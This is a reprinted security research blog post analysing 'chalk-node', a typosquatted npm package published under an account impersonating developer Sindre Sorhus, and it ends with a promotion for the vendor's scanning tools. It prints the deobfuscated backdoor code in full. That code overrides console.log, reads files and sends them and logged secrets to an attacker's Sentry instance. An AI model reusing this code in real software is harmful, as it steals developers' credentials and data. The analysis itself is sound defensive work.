---
layout: reprint
title: 'Author Typosquatting on npm: Attackers Impersonate Sindre So...'
date: '2024-10-31'
canonical_url: https://socket.dev/blog/author-typosquatting-on-npm
source: Socket
---
<div class="prose" dir="ltr"><p>Imitation is not always flattery. Typosquatting, an age-old method of mimicking popular package names, now extends to typosquatting names of the legitimate package authors. A threat actor created the username “<strong><em class="css-1msjh1x">sindresrohus</em></strong>”, slightly altering “<strong><em class="css-1msjh1x">sindresorhus</em></strong>” by swapping two letters to create an illusion of legitimacy. Using this deceptive identity, the copycat published a backdoored package, <a class="chakra-link css-1dkuy37" href="https://socket.dev/npm/package/chalk-node"><code>chalk-node</code></a>, aiming to infiltrate the projects of unsuspecting developers.</p><p>Sindre Sorhus (<a class="chakra-link css-1dkuy37" href="https://github.com/sindresorhus" rel="noopener noreferrer" target="_blank">sindresorhus</a>) is a prominent open source developer known for maintaining more than a thousand popular packages, including <a class="chakra-link css-1dkuy37" href="https://www.npmjs.com/package/chalk" rel="noopener noreferrer" target="_blank"><code>chalk</code></a> – a widely-used npm library for styling terminal text. Sindre’s extensive contributions to the JavaScript and Node.js communities have earned widespread trust among developers.</p><p>Socket’s AI Scanner identified supply chain risks associated with the <code>chalk-node</code> package. The Socket Threat Research Team performed a deep dive analysis of the typosquatted package and petitioned the package registry to remove the malicious <code>chalk-node</code> package, but it is still live on npm at the time of publishing. </p><p>Our analysis identified that the <code>index.esm.js</code> file included in the malicious package is intentionally obfuscated; it redefines the <code>console.log</code> function to read files from the user’s system, leveraging Node.js file system modules like <code>readFileSync</code>, <code>existsSync</code>, and <code>readdirSync</code> to access and exfiltrate sensitive information to an external Sentry instance.</p><h2 class="css-f2cjqg" id="Will-the-real-Sindre-Sorhus-please-stand-up-We're-gonna-have-a-problem-here.">Will the real Sindre Sorhus please stand up? We’re gonna have a problem here.<a class="anchor" href="#Will-the-real-Sindre-Sorhus-please-stand-up-We're-gonna-have-a-problem-here.">#</a></h2><p>By registering an npm account as <strong><em class="css-1msjh1x">sindresrohus</em></strong> (note the reversed “o” and “r” letters) and copying the real <strong><em class="css-1msjh1x">sindresorhus’</em></strong> profile picture, the threat actor aims to exploit the trust placed in the legitimate maintainer. The threat actor published a malicious package named <code>chalk-node</code>, typosquatting the real <code>chalk</code> package. The attacker even replicated the legitimate package’s <code>README</code> to further masquerade the malicious package as authentic.</p><figure class="css-1efvhw7"><img alt=" " class="css-4p5h3n" loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/8bf374505d023b19c6e651bdc1618f7fbc77c62c-745x443.png?w=1600&amp;q=95&amp;fit=max&amp;auto=format"/></figure><h2 class="css-f2cjqg" id="Chalking-up-malicious-intent.">Chalking up malicious intent.<a class="anchor" href="#Chalking-up-malicious-intent.">#</a></h2><p>The typosquatted package <code>chalk-node</code> has 692 <a class="chakra-link css-1dkuy37" href="https://npm-stat.com/charts.html?package=chalk-node&amp;from=2021-10-27&amp;to=2024-10-27" rel="noopener noreferrer" target="_blank">total</a> downloads unlike the real package, which has 334 million <a class="chakra-link css-1dkuy37" href="https://socket.dev/npm/package/chalk">weekly</a> downloads, being one of the most popular packages in the npm ecosystem. The popularity of <code>chalk</code> places it within the upper ranks of npm packages, often featuring in lists of the <a class="chakra-link css-1dkuy37" href="https://gist.github.com/anvaka/8e8fa57c7ee1350e3491" rel="noopener noreferrer" target="_blank">top 10</a> most downloaded or depended-upon packages.</p><p>In addition to legitimate <code>chalk</code> package style, files and code, the copycat <code>chalk-node</code> package buried additional files, such as <a class="chakra-link css-1dkuy37" href="http://index.esm.js/" rel="noopener noreferrer" target="_blank"><code>index.esm.js</code></a>, which Socket’s AI Scanner flagged for accessing the file system, and potentially reading sensitive data. We further analyzed <code>index.esm.js</code> and assess that it functions as a backdoor, reading files from the user’s system and sending sensitive content to an external service without authorization.</p><figure class="css-1efvhw7"><img alt=" " class="css-4p5h3n" loading="lazy" src="https://cdn.sanity.io/images/cgdhsj6q/production/b0510852956e81cfd780a242a40bad1cbd1c64d8-732x501.png?w=1600&amp;q=95&amp;fit=max&amp;auto=format"/></figure><p>The threat actor obfuscated the <code>index.esm.js</code> file, making it difficult to read and understand; however, by analyzing the code’s structure and patterns, we can infer its functionality. The code performs actions that compromise data confidentiality. It accesses sensitive information and makes it accessible beyond its intended scope. Specifically, it uses <code>fs</code> module functions like <code>readFileSync</code>, <code>existsSync</code>, and <code>readdirSync</code> to access the file system. It constructs file paths dynamically, targeting directories relative to the module’s location. The code reads all files in the <code>data</code> directory, capturing stored credentials, configuration files, and data dumps. It overrides <code>console.log</code> to intercept any output containing a colon (<code>:</code>), directly targeting developers who may log sensitive information during debugging or normal operation. The exfiltrated data includes logged objects or messages containing credentials, tokens, URLs, or other sensitive information.</p><p>The <code>index.esm.js</code> captures sensitive information from the file system and sends it to Sentry using <code>Sentry.captureMessage</code>, which could lead to unauthorized data disclosure. The code initializes Sentry with a Data Source Name (DSN), enabling it to send data to a specific Sentry project. While Sentry is a legitimate error-tracking service, misusing it to send unauthorized data constitutes a breach of security and privacy policies.</p><p>The obfuscation and silent error handling suggest an intent to hide malicious activities, such as unauthorized data access and exfiltration. Multiple <code>try</code> and <code>catch</code> blocks with empty <code>catch</code> clauses prevent errors from being logged or handled properly.</p><h2 class="css-f2cjqg" id="Code-tells-the-story.">Code tells the story.<a class="anchor" href="#Code-tells-the-story.">#</a></h2><p>Below are the <code>index.esm.js</code> code snippets with added comments highlighting malicious functionality and intent.</p><pre class="css-1gw6m10"><code class="chakra-code css-n8z13r" lang="javascript">// Importing Sentry for error tracking and monitoring
import e from "@sentry/node";

// Importing necessary modules and assigning them to short variables
import { fileURLToPath as t } from "url";
import { dirname as r, join as n } from "path";
import i from "fs"; // 'i' represents the 'fs' (File System) module

// Initializing Sentry with a Data Source Name (DSN)
// Enables sending data to a specific Sentry project
let K = e; // Alias for Sentry module
const W = "captureMessage"; // Method name for sending messages in Sentry
K.init({
  dsn: "hxxps://6a0d63f9f996c35a809c20ff07359934@o4505703178960896.ingest.sentry[.]io/4505703197310976",
  maxValueLength: 1073741824,
  tracesSampleRate: 1,
});

// Defining helper functions to obfuscate method names
const U = "read";
const L = "Sync";
const X = U + "dir" + L; // 'readdirSync' - reads directory contents synchronously
const G = (e) =&gt; "exists" + e; // Returns 'existsSync' - checks if a file exists
const V = (e) =&gt; e + "File" + L; // Returns 'readFileSync' - reads file contents synchronously

// Function to generate a timestamp string
function Y() {
  var e = new Date();
  return (
    e.getFullYear() +
    `-${String(e.getMonth() + 1).padStart(2, "0")}-${String(e.getDate()).padStart(2, "0")} ` +
    `${String(e.getHours()).padStart(2, "0")}:${String(e.getMinutes()).padStart(2, "0")}:` +
    String(e.getSeconds()).padStart(2, "0")
  );
}

// Function to generate a random string (used as an identifier)
const Z = () =&gt; Math.random().toString(36).substring(2);

// Original console.log function preserved
const ee = console.log;

// Overriding the console.log function
console.log = function (...e) {
  try {
    var t, r;
    ee(...e); // Calls the original console.log with all arguments

    // Anonymous function to perform additional operations
    (() =&gt; {
      try {
        // Constructing a path to the '../data' directory
        var currentPath = r(t(import.meta.url)); // Current directory of the module
        var dataPath = n(currentPath, (e) =&gt; e + e + e)("../"), "data"); // Navigates up three directories to 'data' folder
        var files = i[X](dataPath); // i[X] is 'fs.readdirSync' - reads the 'data' directory

        if (dataPath &amp;&amp; dataPath.length &gt; 0) {
          var randomId = Z(); // Random identifier for logging
          var timestamp = Y(); // Current timestamp

          // Iterates over each file in the 'data' directory
          for (let n = 0; n &lt; files.length; n++)
            try {
              var filePath = dataPath + "/" + files[n];
              // Checks if the file exists using 'fs.existsSync'
              if (i[G(L)](filePath)) {
                // Reads the file content using 'fs.readFileSync'
                var content = i[V(U)](filePath, "utf-8");
                // Sends the file content to Sentry using 'captureMessage' (Potential Data Exfiltration)
                J(timestamp + `&gt;&gt;&gt;${randomId}&gt;&gt;&gt;0`, "" + content);
              }
            } catch (e) {
              /* Empty catch block to silently handle errors */
            }
        }
      } catch (e) {
        /* Empty catch block to silently handle errors */
      }
    })();

    // Checks if any of the logged arguments contain a colon ':'
    if ([...e].some((arg) =&gt; -1 !== arg.toString().indexOf(":"))) {
      t = Z(); // Generates another random identifier
      r = Y(); // Current timestamp
      // Sends the logged data to Sentry (Potentially sensitive information)
      J(r + `&gt;&gt;&gt;${t}&gt;&gt;&gt;1&gt;&gt;&gt;0`, JSON.stringify({ data: [...e] }));
    }
  } catch (t) {
    // In case of an error, fall back to the original console.log
    ee(...e);
  }
};

// Freezes the console object to prevent further modifications
Object.freeze(console);

// Function to send messages to Sentry
const J = (prefix, message) =&gt; {
  try {
    if (-1 !== prefix.indexOf("&gt;&gt;&gt;0")) {
      // Splits the message if it's too long
      var parts = Math.floor(message.length / 7000) + 1;
      for (let i = 1; i &lt;= parts; i++) {
        var part = message.slice((i - 1) * 7000, i * 7000);
        // Sends each part to Sentry
        K[W](`${prefix}&gt;&gt;&gt;${i}&gt;&gt;&gt;` + part);
      }
    } else {
      // Sends the entire message to Sentry
      K[W](prefix + "&gt;&gt;&gt;" + message);
    }
  } catch (e) {
    /* Empty catch block to silently handle errors */
  }
};</code></pre><h2 class="css-f2cjqg" id="Protect-yourself-and-your-organizations-with-Socket's-free-tools.">Protect yourself and your organizations with Socket’s free tools.<a class="anchor" href="#Protect-yourself-and-your-organizations-with-Socket's-free-tools.">#</a></h2><p>Threat actors exploit human error and trust by mimicking and typosquatting trusted authors and packages to infiltrate malicious code into applications. It is crucial to verify package and author names carefully, review third-party code, and use security tools to detect potentially malicious packages.</p><p><a class="chakra-link css-1dkuy37" href="https://socket.dev/features/github">Socket's free GitHub app</a> detects malicious packages and serves as your first line of defense against typosquatting and other supply chain risks like install scripts, telemetry, and known malware. It scans incoming dependencies in real-time with every pull request, instantly alerting developers via a GitHub comment if a potential typosquatted package is detected.</p><h2 class="css-f2cjqg" id="Enhance-security-with-Socket-CLI."><strong>Enhance security with Socket CLI.</strong><a class="anchor" href="#Enhance-security-with-Socket-CLI.">#</a></h2><p>Enhance your security further with the Socket CLI tool, which alerts you to potential typosquatting and other security issues. Its "safe npm" feature proactively shields your machine from bad packages during <code>npm install</code>. Socket wraps npm commands, running the real npm install process while analyzing results in the background — even for deeply nested dependencies. Before writing anything to disk, it alerts you to risky packages, giving you the choice to stop the install or proceed.</p><h2 class="css-f2cjqg" id="Getting-started-is-easy.">Getting started is easy.<a class="anchor" href="#Getting-started-is-easy.">#</a></h2><p>Install the Socket CLI:</p><p><code>npm install -g socket</code></p><p>Then, prefix npm installs with <code>socket</code> to analyze them before installation:</p><p><code>socket npm install react</code></p><h2 class="css-f2cjqg" id="Secure-your-workflow-today.">Secure your workflow today.<a class="anchor" href="#Secure-your-workflow-today.">#</a></h2><p><a class="chakra-link css-1dkuy37" href="https://socket.dev/features/github">Socket for GitHub</a> and Socket CLI integrate seamlessly into your workflow, are free to use, and can save your app or organization from the disastrous consequences of supply chain attacks using typosquatting. Install them today to prevent risky dependencies from landing in your applications.</p></div>